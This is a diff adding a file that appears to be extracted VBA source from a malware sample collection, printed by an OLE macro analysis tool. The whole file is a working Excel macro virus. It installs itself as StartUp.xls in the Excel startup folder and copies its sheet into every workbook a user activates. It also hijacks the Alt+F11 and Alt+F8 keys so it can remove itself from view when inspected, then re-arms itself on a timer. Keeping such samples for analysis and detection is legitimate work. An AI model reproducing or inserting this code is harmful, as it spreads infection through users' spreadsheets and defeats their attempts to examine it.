@@ -1,0 +1,57 @@
+Filename     : ./macros/71f45e2cd2c8fdec666ba153e843514857de746d212e4e0a31f4b28f1c50bd04
+OLE stream   : _VBA_PROJECT_CUR/VBA/StartUp
+VBA filename : StartUp.bas
+----------------------------------------
+Attribute VB_Name = "StartUp"
+Sub auto_open()
+  On Error Resume Next
+  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
+    Application.ScreenUpdating = False
+    ThisWorkbook.Sheets("StartUp").Copy
+    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
+    n$ = ActiveWorkbook.Name
+    ActiveWindow.Visible = False
+    Workbooks("StartUp.xls").Save
+    'Workbooks(n$).Close (False)
+  End If
+  Application.OnSheetActivate = "StartUp.xls!ycop"
+  Application.OnKey "%{F11}", "StartUp.xls!escape"
+  Application.OnKey "%{F8}", "StartUp.xls!escape"
+End Sub
+
+Sub ycop()
+  On Error Resume Next
+  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
+    Application.ScreenUpdating = False
+    n$ = ActiveSheet.Name
+    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
+    Sheets(n$).Select
+  End If
+End Sub
+
+Sub escape()
+    On Error Resume Next
+    Application.OnSheetActivate = "StartUp.xls!back"
+    Application.OnKey "%{F11}"
+    Application.OnKey "%{F8}"
+    Application.SendKeys "%{F11}"
+    Application.SendKeys "%{F8}"
+    For Each book In Workbooks
+        Application.DisplayAlerts = False
+        If book <> "StartUp.xls" Then book.Sheets("StartUp").Delete
+    Next
+    For Each book In Workbooks
+        If book.Name = "StartUp.xls" Then
+        book.Close
+    End If
+    Next
+End Sub
+
+Sub back()
+  On Error Resume Next
+  Application.OnKey "%{F8}", "StartUp.xls!escape"
+  Application.OnKey "%{F11}", "StartUp.xls!escape"
+  Application.OnSheetActivate = "StartUp.xls!ycop"
+  Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!ycop"
+  Workbooks.Open Application.StartupPath & "\StartUp.xls"
+End Sub
